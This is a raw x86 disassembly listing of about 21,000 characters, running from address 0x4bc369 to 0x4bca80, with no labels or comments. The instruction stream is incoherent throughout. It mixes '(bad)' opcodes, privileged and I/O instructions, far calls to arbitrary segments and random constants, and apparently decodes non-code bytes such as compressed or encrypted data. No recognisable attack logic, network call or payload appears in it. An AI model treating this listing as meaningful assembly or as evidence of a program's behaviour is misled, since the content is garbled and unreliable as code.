  4bc369:	sbb    ecx,DWORD PTR [ecx+0x17201cd7]
  4bc36f:	push   ebp
  4bc370:	push   esi
  4bc371:	sub    bh,cl
  4bc373:	dec    edi
  4bc374:	imul   eax,DWORD PTR [eax+edx*1+0x10],0xda82105d
  4bc37c:	or     BYTE PTR [edi-0x35],bh
  4bc37f:	mov    edi,?
  4bc381:	push   es
  4bc382:	retf   0x5108
  4bc385:	ins    BYTE PTR es:[edi],dx
  4bc386:	or     BYTE PTR ds:0xf4320d94,ch
  4bc38c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4bc38d:	shl    DWORD PTR [eax+0x2a74f34e],0x83
  4bc394:	xor    dh,BYTE PTR [eax]
  4bc396:	xchg   ebx,eax
  4bc397:	inc    ecx
  4bc398:	pmuludq mm4,QWORD PTR [ebx]
  4bc39b:	cmp    edx,0xffffffda
  4bc39e:	fst    QWORD PTR [ebp-0x40]
  4bc3a1:	jmp    0xa8641a06
  4bc3a6:	popa   
  4bc3a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4bc3a8:	call   0x57d7:0xd1168be8
  4bc3af:	inc    ebp
  4bc3b0:	push   eax
  4bc3b1:	aaa    
  4bc3b2:	enter  0x2eff,0x1e
  4bc3b6:	xchg   ecx,eax
  4bc3b7:	aam    0xcd
  4bc3b9:	rcl    DWORD PTR [eax-0x1a],1
  4bc3bc:	jns    0x4bc349
  4bc3be:	and    BYTE PTR [eax+0x8],dh
  4bc3c1:	rcl    DWORD PTR [eax],0x8e
  4bc3c4:	adc    eax,0xd0ea48ea
  4bc3c9:	dec    esi
  4bc3ca:	adc    BYTE PTR [ebx],dh
  4bc3cc:	adc    al,0x24
  4bc3ce:	add    al,BYTE PTR [esi-0x7f]
  4bc3d1:	test   dl,al
  4bc3d3:	shl    BYTE PTR [ecx-0x41],0x1f
  4bc3d7:	enter  0x746f,0x3e
  4bc3db:	ret    0x6a0
  4bc3de:	xor    esp,DWORD PTR ds:0x2b642c06
  4bc3e4:	pop    eax
  4bc3e5:	xchg   bh,cl
  4bc3e7:	mov    ch,0x11
  4bc3e9:	stos   DWORD PTR es:[edi],eax
  4bc3ea:	(bad)  
  4bc3eb:	and    al,0xb6
  4bc3ed:	adc    eax,0xa6ff11
  4bc3f2:	xor    bl,ah
  4bc3f4:	cmp    edi,DWORD PTR [eax+0x50]
  4bc3f7:	add    DWORD PTR [ecx+0x4602fb11],ecx
  4bc3fd:	sahf   
  4bc3fe:	rcl    BYTE PTR [edx+0x13eb833],1
  4bc404:	mov    eax,ds:0xce232c9
  4bc409:	in     al,dx
  4bc40a:	ret    0x12e6
  4bc40d:	add    BYTE PTR [eax-0x28],bl
  4bc410:	mov    ds:0x1289a233,eax
  4bc415:	inc    esp
  4bc416:	ds mov esp,cs
  4bc419:	(bad)  
  4bc41a:	ds in  eax,dx
  4bc41c:	daa    
  4bc41d:	cli    
  4bc41e:	or     bh,bh
  4bc420:	dec    ebp
  4bc421:	adc    al,dl
  4bc423:	jne    0x4bc3e2
  4bc425:	vhsubps ymm6,ymm2,YMMWORD PTR [ecx]
  4bc429:	xchg   ecx,eax
  4bc42a:	into   
  4bc42b:	lds    ecx,FWORD PTR [ecx+0x0]
  4bc42e:	jb     0x4bc498
  4bc430:	add    DWORD PTR [esi],0x30f41177
  4bc436:	jns    0x4bc446
  4bc438:	jb     0x4bc401
  4bc43a:	daa    
  4bc43b:	cmp    al,cl
  4bc43d:	js     0x4bc3d5
  4bc43f:	hlt    
  4bc440:	hlt    
  4bc441:	int    0xd9
  4bc443:	mov    ds:0x45005894,al
  4bc448:	jb     0x4bc4a7
  4bc44a:	and    al,0x70
  4bc44c:	mov    BYTE PTR [ebp+0x916e5e4],bh
  4bc452:	sbb    al,0xe4
  4bc454:	or     DWORD PTR [esi-0x5bad857f],ecx
  4bc45a:	sub    DWORD PTR [edi+0x40],esp
  4bc45d:	clc    
  4bc45e:	clc    
  4bc45f:	adc    BYTE PTR [eax],al
  4bc461:	mov    ecx,0x56c4e468
  4bc466:	or     al,0x4
  4bc468:	dec    edi
  4bc469:	rcl    BYTE PTR [edi],0x9e
  4bc46c:	pushf  
  4bc46d:	adc    al,0x60
  4bc46f:	dec    esp
  4bc470:	xor    esi,ebx
  4bc472:	inc    eax
  4bc473:	(bad)  
  4bc474:	push   0xffffffeb
  4bc476:	jne    0x4bc4b7
  4bc478:	xor    eax,0xea2ec283
  4bc47d:	fisttp QWORD PTR ds:0xb74b40d0
  4bc483:	mov    eax,ds:0x20e4022b
  4bc488:	add    BYTE PTR [ecx+edx*2-0x5b8f5f01],ah
  4bc48f:	mov    ah,0x5a
  4bc491:	pushf  
  4bc492:	add    DWORD PTR [edi-0x7ceb87b],0xffffff92
  4bc499:	adc    al,al
  4bc49b:	pop    es
  4bc49c:	test   BYTE PTR [ebp-0x4b],bl
  4bc49f:	fdiv   DWORD PTR [edx]
  4bc4a1:	or     ah,0x5d
  4bc4a4:	push   edx
  4bc4a5:	cli    
  4bc4a6:	and    cl,BYTE PTR [edi-0x43d62d8a]
  4bc4ac:	aam    0x44
  4bc4ae:	in     al,dx
  4bc4af:	add    edi,DWORD PTR [edx+esi*2]
  4bc4b2:	fst    QWORD PTR [edx]
  4bc4b4:	pop    ebp
  4bc4b5:	add    ebp,ebx
  4bc4b7:	adc    dh,bh
  4bc4b9:	adc    bh,BYTE PTR [edx]
  4bc4bb:	nop
  4bc4bc:	adc    ah,ah
  4bc4be:	shr    DWORD PTR [ebx+eax*1-0x30],cl
  4bc4c2:	push   ss
  4bc4c3:	add    al,0x53
  4bc4c5:	fsub   st,st(4)
  4bc4c7:	adc    DWORD PTR [esi],edx
  4bc4c9:	adc    cl,0x2
  4bc4cc:	xchg   edi,eax
  4bc4cd:	mov    ecx,DWORD PTR [ecx-0x40]
  4bc4d0:	(bad)  
  4bc4d1:	lds    ebx,FWORD PTR [edi]
  4bc4d3:	sub    DWORD PTR [edx+eiz*2-0x4a9d6ec0],esp
  4bc4da:	dec    ebp
  4bc4db:	aas    
  4bc4dc:	fst    QWORD PTR [ecx+0x79]
  4bc4df:	inc    ecx
  4bc4e0:	add    dl,BYTE PTR [ecx]
  4bc4e2:	mov    eax,ds:0x4035ed23
  4bc4e7:	mov    cl,0x1b
  4bc4e9:	xchg   esp,eax
  4bc4ea:	mov    bl,0x1f
  4bc4ec:	sbb    al,0x2d
  4bc4ee:	and    cl,cl
  4bc4f0:	in     al,dx
  4bc4f1:	or     ecx,DWORD PTR [ecx+0x2]
  4bc4f4:	pop    es
  4bc4f5:	and    al,0x72
  4bc4f7:	clc    
  4bc4f8:	rcl    cl,0x0
  4bc4fb:	push   edx
  4bc4fc:	(bad)  [edx]
  4bc4fe:	arpl   WORD PTR ds:0x52250f0c,ax
  4bc504:	pop    es
  4bc505:	aad    0xf0
  4bc507:	sub    al,0x3
  4bc509:	or     DWORD PTR [ebp+0x31],0x802b014a
  4bc510:	retf   
  4bc511:	movlps xmm6,QWORD PTR [edx-0x13b153ec]
  4bc518:	cs ins BYTE PTR es:[edi],dx
  4bc51a:	dec    ebp
  4bc51b:	adc    al,0xf3
  4bc51d:	outs   dx,BYTE PTR ds:[esi]
  4bc51e:	dec    edi
  4bc51f:	add    ecx,DWORD PTR [eax]
  4bc521:	adc    al,0x10
  4bc523:	gs adc eax,0xe9634180
  4bc529:	adc    edx,esp
  4bc52b:	mov    gs,WORD PTR [ebp+0x15]
  4bc52e:	lea    esi,[ecx+0x6c830bf5]
  4bc534:	sbb    DWORD PTR [esi],ebp
  4bc536:	push   edi
  4bc537:	mov    WORD PTR [edx],ds
  4bc539:	addr16 aas 
  4bc53b:	or     bl,ch
  4bc53d:	call   0x9230:0x2c33721
  4bc544:	outs   dx,BYTE PTR ds:[esi]
  4bc545:	push   es
  4bc546:	jg     0x4bc550
  4bc548:	ret    
  4bc549:	push   edx
  4bc54a:	ret    
  4bc54b:	jb     0x4bc58a
  4bc54d:	or     ch,BYTE PTR [ebp-0x73]
  4bc550:	pop    eax
  4bc551:	rcr    DWORD PTR [edi],cl
  4bc553:	pop    esi
  4bc554:	je     0x4bc4f3
  4bc556:	sub    eax,0xd1e56c02
  4bc55b:	mov    eax,0x5310e00d
  4bc560:	mov    ebx,0xc66002c2
  4bc565:	mov    ds:0xf013223f,al
  4bc56a:	ss ins BYTE PTR es:[edi],dx
  4bc56c:	lahf   
  4bc56d:	mov    ds:0xfc81f05d,al
  4bc572:	or     edx,DWORD PTR [ebx+0x532c286]
  4bc578:	lock jecxz 0x4bc57b
  4bc57b:	push   ds
  4bc57c:	cs sti 
  4bc57e:	pop    es
  4bc57f:	or     edx,DWORD PTR [ebx-0x11]
  4bc582:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4bc583:	mov    WORD PTR [ecx+eax*1],?
  4bc586:	dec    eax
  4bc587:	add    eax,esi
  4bc589:	retf   
  4bc58a:	and    dl,BYTE PTR [esi-0x6b]
  4bc58d:	addr16 cmp eax,0x21b42508
  4bc593:	data16 jb 0x4bc5dc
  4bc596:	add    edi,DWORD PTR [ebx+0x285f2f00]
  4bc59c:	pop    ebp
  4bc59d:	add    eax,eax
  4bc59f:	ror    DWORD PTR [ecx],0x78
  4bc5a2:	dec    ebx
  4bc5a3:	sahf   
  4bc5a4:	dec    eax
  4bc5a5:	inc    esi
  4bc5a6:	add    bl,BYTE PTR es:[eax]
  4bc5a9:	(bad)  
  4bc5aa:	shr    DWORD PTR [ebx],cl
  4bc5ac:	lods   eax,DWORD PTR ds:[esi]
  4bc5ad:	push   ecx
  4bc5ae:	and    BYTE PTR [eax-0x7a],ah
  4bc5b1:	push   edx
  4bc5b2:	lock adc dh,BYTE PTR [ebx]
  4bc5b5:	inc    esi
  4bc5b6:	jo     0x4bc5f0
  4bc5b8:	cmp    BYTE PTR [edx],dl
  4bc5ba:	jo     0x4bc5c7
  4bc5bc:	mov    fs,esi
  4bc5be:	cmp    edx,DWORD PTR [ecx+ecx*1-0x2a3a7c4]
  4bc5c5:	push   edx
  4bc5c6:	add    al,0x4a
  4bc5c8:	push   cs
  4bc5c9:	xchg   esp,eax
  4bc5ca:	push   edx
  4bc5cb:	adc    edi,DWORD PTR [ecx]
  4bc5cd:	ror    BYTE PTR [ebx+0x13026a44],1
  4bc5d3:	xchg   BYTE PTR [esi+0x6],bl
  4bc5d6:	xchg   DWORD PTR [edi],eax
  4bc5d8:	retf   
  4bc5d9:	call   DWORD PTR [edi+0xe]
  4bc5dc:	adc    BYTE PTR [ecx-0x20],bl
  4bc5df:	cwde   
  4bc5e0:	mov    ch,0x3
  4bc5e2:	or     al,0xa4
  4bc5e4:	and    BYTE PTR ds:0x52153065,dh
  4bc5ea:	pop    es
  4bc5eb:	mov    dh,0xcd
  4bc5ed:	add    BYTE PTR [eax+0x40],dh
  4bc5f0:	sbb    al,0x6d
  4bc5f2:	inc    WORD PTR [esi]
  4bc5f5:	dec    ebp
  4bc5f6:	cdq    
  4bc5f7:	inc    eax
  4bc5f8:	add    bl,BYTE PTR [edi]
  4bc5fa:	sbb    BYTE PTR [esp+edi*8],ah
  4bc5fd:	sbb    ch,BYTE PTR [eax-0x20]
  4bc600:	xor    al,0x5
  4bc602:	push   edi
  4bc603:	and    DWORD PTR [ecx],eax
  4bc605:	inc    ebp
  4bc606:	les    eax,FWORD PTR [eax-0x25b1b1fc]
  4bc60c:	inc    esp
  4bc60d:	xor    eax,0xc0370f0
  4bc612:	in     al,dx
  4bc613:	lea    edx,[esi]
  4bc615:	xor    DWORD PTR [ecx+0x2],ebp
  4bc618:	push   edi
  4bc619:	mov    ch,0x42
  4bc61b:	add    bl,cl
  4bc61d:	hlt    
  4bc61e:	jecxz  0x4bc5e1
  4bc620:	fld    DWORD PTR [edi+esi*4+0x2cf7e565]
  4bc627:	sbb    al,0x65
  4bc629:	mov    ah,0x8
  4bc62b:	hlt    
  4bc62c:	push   cs
  4bc62d:	bound  eax,QWORD PTR ds:0xecf09f80
  4bc633:	push   ebx
  4bc634:	push   edx
  4bc635:	or     eax,0xd0347428
  4bc63a:	push   ebp
  4bc63b:	(bad)
  4bc63e:	mov    esi,0x946945d6
  4bc643:	dec    ebx
  4bc644:	movntps XMMWORD PTR [esi],xmm6
  4bc647:	and    al,BYTE PTR [ecx+esi*2]
  4bc64a:	aaa    
  4bc64b:	xor    BYTE PTR es:[esi-0x8a802f8],ch
  4bc652:	mov    dh,BYTE PTR [eax]
  4bc654:	je     0x4bc656
  4bc656:	add    al,0x8f
  4bc658:	push   eax
  4bc659:	and    al,0xb7
  4bc65b:	add    esp,DWORD PTR [eax]
  4bc65d:	xchg   ecx,eax
  4bc65e:	cmp    ecx,DWORD PTR [ebx+0x11]
  4bc661:	out    dx,al
  4bc662:	push   es
  4bc663:	int3   
  4bc664:	mov    BYTE PTR [esi+0x30],cl
  4bc667:	stc    
  4bc668:	adc    DWORD PTR [eax],0xc7c04650
  4bc66e:	enter  0xc8e2,0xda
  4bc672:	or     cl,cl
  4bc674:	retf   0x1c8c
  4bc677:	push   edi
  4bc678:	lock push ss
  4bc67a:	dec    esi
  4bc67b:	loopne 0x4bc64b
  4bc67d:	sahf   
  4bc67e:	adc    DWORD PTR [eax+ebx*1+0x36c68150],ecx
  4bc685:	or     eax,0xbcf3250b
  4bc68a:	add    edi,DWORD PTR [esi-0x764f81fd]
  4bc690:	mov    ebx,DWORD PTR [eax-0x6c76d35b]
  4bc696:	lock add cl,BYTE PTR [edx-0x3fac5a58]
  4bc69d:	xor    BYTE PTR [edx+0x681862d8],ch
  4bc6a3:	aas    
  4bc6a4:	cs push edi
  4bc6a6:	xor    al,0x6c
  4bc6a8:	cmp    BYTE PTR ds:0x58077811,ch
  4bc6ae:	inc    esp
  4bc6af:	sar    BYTE PTR [ecx+0x3],cl
  4bc6b2:	fmul   DWORD PTR [eax+0x4d]
  4bc6b5:	xlat   BYTE PTR ds:[ebx]
  4bc6b6:	push   0x774d77ce
  4bc6bb:	jmp    0x5047:0x114c4c81
  4bc6c2:	mov    DWORD PTR [ebx-0x125a99ac],eax
  4bc6c8:	adc    al,dh
  4bc6ca:	dec    edi
  4bc6cb:	push   esp
  4bc6cc:	mov    edx,0x495717f8
  4bc6d1:	clc    
  4bc6d2:	rcl    BYTE PTR [edx-0x78],0xd0
  4bc6d6:	retf   
  4bc6d7:	test   BYTE PTR [edi+edi*1],dh
  4bc6da:	and    ch,BYTE PTR [edi]
  4bc6dc:	sub    esp,0x40
  4bc6df:	push   ebx
  4bc6e0:	pop    eax
  4bc6e1:	lock bound ebp,QWORD PTR [eax]
  4bc6e4:	repnz add eax,0x8da1e816
  4bc6ea:	mov    es,WORD PTR [ebx-0x769b3592]
  4bc6f0:	cwde   
  4bc6f1:	push   esi
  4bc6f2:	pop    es
  4bc6f3:	xchg   ebp,eax
  4bc6f4:	pop    es
  4bc6f5:	and    ah,BYTE PTR [ebx-0x7e]
  4bc6f8:	lea    edx,[esi-0x66]
  4bc6fb:	sbb    eax,DWORD PTR [eax-0x71f86a0e]
  4bc701:	mov    edx,DWORD PTR [ebx-0x74d7a877]
  4bc707:	adc    DWORD PTR [ebx+0x1c],0x54
  4bc70b:	add    DWORD PTR [eax-0x75],esp
  4bc70e:	lea    ecx,[edx+0x26]
  4bc711:	outs   dx,DWORD PTR ds:[esi]
  4bc712:	and    BYTE PTR [eax],bh
  4bc714:	dec    ebp
  4bc715:	xor    al,bh
  4bc717:	scas   al,BYTE PTR es:[edi]
  4bc718:	mov    BYTE PTR [edx+0x15ed9577],cl
  4bc71e:	sbb    DWORD PTR [edx+0x48686f34],edi
  4bc724:	add    al,0x48
  4bc726:	inc    ebp
  4bc727:	xlat   BYTE PTR ds:[ebx]
  4bc728:	push   esp
  4bc729:	ss dec esp
  4bc72b:	add    al,0x4c
  4bc72d:	push   esp
  4bc72e:	adc    DWORD PTR [edi-0x4c],ecx
  4bc731:	repz shl DWORD PTR [esi+0x2],1
  4bc735:	(bad)  
  4bc736:	icebp  
  4bc737:	inc    ebp
  4bc738:	les    edi,FWORD PTR [edx]
  4bc73a:	push   esp
  4bc73b:	inc    esi
  4bc73c:	sti    
  4bc73d:	jno    0x4bc6de
  4bc73f:	pop    edi
  4bc740:	inc    eax
  4bc741:	or     eax,edx
  4bc743:	pop    esp
  4bc744:	sbb    dl,bl
  4bc746:	or     al,0x30
  4bc748:	sub    ecx,DWORD PTR [ecx-0xc]
  4bc74b:	and    bh,BYTE PTR [edi-0x30]
  4bc74e:	sub    esi,DWORD PTR [eax-0x4f]
  4bc751:	dec    edx
  4bc752:	sbb    BYTE PTR [ebx+0x4c8482d7],dl
  4bc758:	xchg   edx,eax
  4bc759:	fisttp QWORD PTR [edx+ebx*2]
  4bc75c:	push   ebp
  4bc75d:	xor    BYTE PTR [edi+0x6042c40],dl
  4bc763:	dec    ebp
  4bc764:	pop    ebx
  4bc765:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4bc766:	add    al,0xc
  4bc768:	adc    al,al
  4bc76a:	nop
  4bc76b:	push   cs
  4bc76c:	or     DWORD PTR [eax+0xc3e143a],ebp
  4bc772:	ins    BYTE PTR es:[edi],dx
  4bc773:	mov    al,0x12
  4bc775:	ficom  WORD PTR [edi+0x1036f4fe]
  4bc77b:	sahf   
  4bc77c:	cmp    BYTE PTR [edi],ah
  4bc77e:	ins    DWORD PTR es:[edi],dx
  4bc77f:	push   ebp
  4bc780:	sbb    BYTE PTR [esi+0x3a],bl
  4bc783:	adc    edi,DWORD PTR ds:0x557b9a21
  4bc789:	and    al,BYTE PTR [ebp+0x36422b89]
  4bc78f:	inc    DWORD PTR [eax]
  4bc791:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4bc792:	mov    eax,ds:0xfcb1a5bd
  4bc797:	(bad)
  4bc79b:	mov    WORD PTR [edi-0x4c4513a],ds
  4bc7a1:	std    
  4bc7a2:	mov    ds:0x2518b6d5,eax
  4bc7a7:	lea    eax,[edx]
  4bc7a9:	pop    es
  4bc7aa:	adc    DWORD PTR [esi+0x69c41836],esi
  4bc7b0:	xchg   edx,eax
  4bc7b1:	push   es
  4bc7b2:	xor    DWORD PTR [eax],0x77
  4bc7b5:	sub    BYTE PTR [ecx],dl
  4bc7b7:	push   ebx
  4bc7b8:	dec    ebx
  4bc7b9:	pop    es
  4bc7ba:	pusha  
  4bc7bb:	inc    edi
  4bc7bc:	ss xchg esi,eax
  4bc7be:	cmp    eax,ebx
  4bc7c0:	popa   
  4bc7c1:	push   edx
  4bc7c2:	aaa    
  4bc7c3:	push   ecx
  4bc7c4:	dec    esi
  4bc7c5:	sub    DWORD PTR [edx+ebp*1+0x55],ecx
  4bc7c9:	rcl    BYTE PTR [edi+0x386ce20c],0x7
  4bc7d0:	or     BYTE PTR [edi],cl
  4bc7d2:	inc    edi
  4bc7d3:	call   0x1a702f1b
  4bc7d8:	dec    ebx
  4bc7d9:	mov    esi,cr7
  4bc7dc:	sbb    DWORD PTR [ebx],ebx
  4bc7de:	add    al,dl
  4bc7e0:	xor    eax,0x5cf4c00b
  4bc7e5:	sub    eax,esp
  4bc7e7:	inc    esi
  4bc7e8:	push   0xf4307708
  4bc7ed:	test   DWORD PTR [edx+0x47],0xf713494c
  4bc7f4:	out    dx,eax
  4bc7f5:	or     al,0x97
  4bc7f7:	sbb    dl,BYTE PTR [edx+0x69]
  4bc7fa:	or     ah,BYTE PTR [edx]
  4bc7fc:	shl    BYTE PTR [esi+0x24dd49ec],cl
  4bc802:	adc    ah,BYTE PTR [edx]
  4bc804:	in     al,dx
  4bc805:	cwde   
  4bc806:	inc    esp
  4bc807:	mov    eax,ds:0xc213ca7d
  4bc80c:	sub    al,0xaf
  4bc80e:	sbb    bh,BYTE PTR [eax-0x64cbc72e]
  4bc814:	mov    al,0xc6
  4bc816:	dec    ebx
  4bc817:	jno    0x4bc83c
  4bc819:	icebp  
  4bc81a:	add    eax,0xc6f6eb54
  4bc81f:	inc    edi
  4bc820:	imul   ebp,ecx,0x45d33e09
  4bc826:	cmp    BYTE PTR [edx+ecx*2-0x30],bl
  4bc82a:	push   es
  4bc82b:	pop    es
  4bc82c:	clc    
  4bc82d:	push   cs
  4bc82e:	xor    al,0xf
  4bc830:	nop
  4bc831:	xor    eax,0x6160096
  4bc836:	test   BYTE PTR [edi-0x78393152],dh
  4bc83c:	mov    dh,BYTE PTR [esi-0x167d6e82]
  4bc842:	inc    esp
  4bc843:	cmp    BYTE PTR [eax+0x211a07eb],al
  4bc849:	add    ebp,ecx
  4bc84b:	daa    
  4bc84c:	add    BYTE PTR [ebx-0x2f],bl
  4bc84f:	mov    ah,0x3
  4bc851:	enter  0x1cf8,0xa
  4bc855:	cld    
  4bc856:	sub    BYTE PTR ds:0xecb01702,cl
  4bc85c:	inc    ebp
  4bc85d:	xor    eax,0x157e264c
  4bc862:	in     al,0x75
  4bc864:	xor    eax,0x14be561d
  4bc869:	lods   eax,DWORD PTR ds:[esi]
  4bc86a:	mov    eax,ds:0xaaf5a56e
  4bc86f:	icebp  
  4bc870:	call   0x566a:0x5894ba10
  4bc877:	pop    esp
  4bc878:	cmp    dh,BYTE PTR [ebx+0x64a1341e]
  4bc87e:	pop    esi
  4bc87f:	jl     0x4bc8e6
  4bc881:	cld    
  4bc882:	push   es
  4bc883:	cmc    
  4bc884:	push   edx
  4bc885:	push   ss
  4bc886:	mov    al,0xca
  4bc888:	jmp    0x4bc8d5
  4bc88a:	add    eax,0x570776b2
  4bc88f:	jle    0x4bc87b
  4bc891:	sbb    eax,0x2cd746cd
  4bc896:	jmp    0x803:0xe608cf05
  4bc89d:	xor    DWORD PTR [ecx+ebx*4],ebp
  4bc8a0:	inc    ebx
  4bc8a1:	(bad)  [ebp+0x7075e85]
  4bc8a7:	in     al,dx
  4bc8a8:	test   BYTE PTR [eax+edx*2],ah
  4bc8ab:	repz push es
  4bc8ad:	(bad)  [esi+0x2]
  4bc8b0:	dec    edx
  4bc8b1:	inc    ebx
  4bc8b2:	leave  
  4bc8b3:	push   edi
  4bc8b4:	dec    esp
  4bc8b5:	mov    es,WORD PTR [ebp+0x4]
  4bc8b8:	jmp    FWORD PTR [eax*1-0x36b86d71]
  4bc8bf:	add    ebx,DWORD PTR ds:0xe3017e02
  4bc8c5:	push   ds
  4bc8c6:	and    eax,0xfe04250f
  4bc8cb:	pop    ecx
  4bc8cc:	std    
  4bc8cd:	addr16 inc eax
  4bc8cf:	pop    edx
  4bc8d0:	lds    eax,FWORD PTR [eax-0x54]
  4bc8d3:	sbb    al,0x42
  4bc8d5:	sbb    BYTE PTR [edx-0x30d3d8c],bl
  4bc8db:	cmp    eax,0x42922c6b
  4bc8e0:	dec    esi
  4bc8e1:	add    BYTE PTR [ebp-0x2e],dh
  4bc8e4:	add    eax,0xf45b7718
  4bc8e9:	loopne 0x4bc8db
  4bc8eb:	and    DWORD PTR [esi],esi
  4bc8ed:	cmp    dh,BYTE PTR [ebx]
  4bc8ef:	in     al,dx
  4bc8f0:	jno    0x4bc8f9
  4bc8f2:	in     al,dx
  4bc8f3:	fcmovu st,st(1)
  4bc8f5:	add    BYTE PTR [eax-0x8],0x1
  4bc8f9:	mov    ch,0xfb
  4bc8fb:	js     0x4bc93a
  4bc8fd:	unpcklps xmm5,XMMWORD PTR ds:0xcc8fa0f
  4bc904:	sub    al,0x3d
  4bc906:	repz mov esp,0x3a788a77
  4bc90c:	shl    BYTE PTR [eax],cl
  4bc90e:	(bad)  
  4bc910:	lock sti 
  4bc912:	pop    eax
  4bc913:	dec    dh
  4bc915:	or     al,0x5b
  4bc917:	add    edi,esp
  4bc919:	inc    ebp
  4bc91a:	pop    ebx
  4bc91b:	sub    ch,BYTE PTR [edi+ecx*1-0x6e]
  4bc91f:	mov    bl,0xc3
  4bc921:	stc    
  4bc922:	aam    0xf8
  4bc924:	cmc    
  4bc925:	jcxz   0x4bc944
  4bc928:	xchg   ebx,eax
  4bc929:	aaa    
  4bc92a:	out    dx,eax
  4bc92b:	add    edi,ebx
  4bc92d:	fidiv  WORD PTR [edx+esi*8-0x6412124d]
  4bc934:	push   ebx
  4bc935:	jne    0x4bc8fe
  4bc937:	xor    DWORD PTR [ecx+esi*4],esp
  4bc93a:	jo     0x4bc97e
  4bc93c:	or     cl,BYTE PTR [ecx]
  4bc93e:	dec    ecx
  4bc93f:	popa   
  4bc940:	xchg   ebp,eax
  4bc941:	and    BYTE PTR [ecx],bh
  4bc943:	dec    ebx
  4bc944:	dec    eax
  4bc945:	xchg   ecx,eax
  4bc946:	jmp    0x4bc9bc
  4bc948:	jl     0x4bc98b
  4bc94a:	mov    esi,0xb3f7f045
  4bc94f:	push   ebx
  4bc950:	fs jae 0x4bc9a9
  4bc953:	push   es
  4bc954:	je     0x4bc976
  4bc956:	or     DWORD PTR [ebx+0x1d],ecx
  4bc959:	pop    edi
  4bc95a:	jo     0x4bc979
  4bc95c:	lea    edx,[edx-0x65]
  4bc95f:	add    edi,eax
  4bc961:	jl     0x4bc91a
  4bc963:	dec    edx
  4bc964:	push   ds
  4bc965:	and    eax,0x6104dd53
  4bc96a:	mov    cs,WORD PTR [edi]
  4bc96c:	call   0xc10f:0x6eeb559e
  4bc973:	jmp    0x4bc9c3
  4bc975:	stos   DWORD PTR es:[edi],eax
  4bc976:	dec    ebp
  4bc977:	mov    al,ds:0xecf581f1
  4bc97c:	jmp    0x4bc9ac
  4bc97e:	cmc    
  4bc97f:	mov    ebx,0xbd83fb04
  4bc984:	jno    0x4bc9a5
  4bc986:	jmp    0x4bc9a5
  4bc988:	popa   
  4bc989:	pop    edi
  4bc98a:	push   es
  4bc98b:	xchg   esp,eax
  4bc98c:	sbb    al,0xd0
  4bc98e:	xor    DWORD PTR [ebp-0x7eac27d9],eax
  4bc994:	sub    eax,0x306aebe9
  4bc999:	or     edi,DWORD PTR [esi-0x14d292f1]
  4bc99f:	loopne 0x4bc998
  4bc9a1:	dec    edx
  4bc9a2:	fcomp  DWORD PTR [eax]
  4bc9a4:	lea    ebx,[ebp-0x5f]
  4bc9a7:	cmp    BYTE PTR [eax],0x75
  4bc9aa:	jmp    0x45ea:0xb500f68a
  4bc9b1:	sub    BYTE PTR [edx-0x4e687784],cl
  4bc9b7:	xchg   DWORD PTR [ecx-0x7f4bf7ea],ecx
  4bc9bd:	cdq    
  4bc9be:	pushf  
  4bc9bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4bc9c0:	sub    al,0x73
  4bc9c2:	jns    0x4bc9b6
  4bc9c4:	or     eax,0x94c55bc4
  4bc9c9:	and    esi,ebp
  4bc9cb:	les    ebp,FWORD PTR [ebp+ecx*4-0x30]
  4bc9cf:	call   DWORD PTR [eax]
  4bc9d1:	and    DWORD PTR [ebx+eax*4],esp
  4bc9d4:	jle    0x4bca52
  4bc9d6:	push   ebp
  4bc9d7:	jne    0x4bc9f7
  4bc9d9:	cmp    DWORD PTR [esi+0xd0ed3a3],0x7f1275e1
  4bc9e3:	adc    BYTE PTR [ecx],cl
  4bc9e5:	xor    ecx,0x26f32913
  4bc9eb:	mov    ecx,DWORD PTR [ecx]
  4bc9ed:	mov    dh,0xf4
  4bc9ef:	inc    eax
  4bc9f0:	les    edx,FWORD PTR [ecx-0x72]
  4bc9f3:	pop    ss
  4bc9f4:	out    dx,al
  4bc9f5:	lods   al,BYTE PTR ds:[esi]
  4bc9f6:	js     0x4bca19
  4bc9f8:	rcl    BYTE PTR [esi+0x7c],1
  4bc9fb:	xchg   edi,eax
  4bc9fc:	daa    
  4bc9fd:	sub    BYTE PTR [ecx],0x0
  4bca00:	in     al,dx
  4bca01:	inc    DWORD PTR [esi]
  4bca03:	idiv   ah
  4bca05:	enter  0x110d,0xd
  4bca09:	cmp    DWORD PTR [ebx+0x65704821],edx
  4bca0f:	stos   DWORD PTR es:[edi],eax
  4bca10:	xor    eax,0xfc201c08
  4bca15:	loope  0x4bca5b
  4bca17:	les    ecx,FWORD PTR [esp-0x29]
  4bca1b:	paddd  mm4,QWORD PTR [eax]
  4bca1e:	fist   DWORD PTR [eax+0x51319db2]
  4bca24:	adc    bh,BYTE PTR [esp+eiz*4+0x26]
  4bca28:	mov    edx,0x6a4724c8
  4bca2d:	push   edx
  4bca2e:	mov    ebx,0xa70913c1
  4bca33:	retf   0x321a
  4bca36:	loopne 0x4bc9ce
  4bca38:	nop
  4bca39:	add    ah,cl
  4bca3b:	rol    BYTE PTR [ebx-0x3f],0x9e
  4bca3f:	dec    eax
  4bca40:	jmp    0x4bca5c
  4bca42:	add    ebx,DWORD PTR [edi+edx*8+0x4920b36c]
  4bca49:	inc    edx
  4bca4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4bca4b:	push   edx
  4bca4c:	test   al,0xf0
  4bca4e:	jl     0x4bca2a
  4bca50:	rol    BYTE PTR [edi],0x90
  4bca53:	shr    cl,0x34
  4bca56:	cmp    eax,0x2cbe101
  4bca5b:	jbe    0x4bc9e2
  4bca5d:	jnp    0x4bca47
  4bca5f:	jmp    0x4bca89
  4bca61:	stos   DWORD PTR es:[edi],eax
  4bca62:	sub    dl,bh
  4bca64:	cs out dx,eax
  4bca66:	xor    al,BYTE PTR [ecx+edx*8]
  4bca69:	push   eax
  4bca6a:	jmp    0x4bcaba
  4bca6c:	ja     0x4bcabb
  4bca6e:	or     BYTE PTR [ebx+0x55922ce8],ch
  4bca74:	repz sbb BYTE PTR [ecx],ah
  4bca77:	xchg   esp,eax
  4bca78:	outs   dx,BYTE PTR ds:[esi]
  4bca79:	jmp    0x4bca8a
  4bca7b:	dec    esp
  4bca7c:	dec    eax
  4bca7d:	test   al,0xac
  4bca7f:	pop    es
  4bca80:	int    0x61
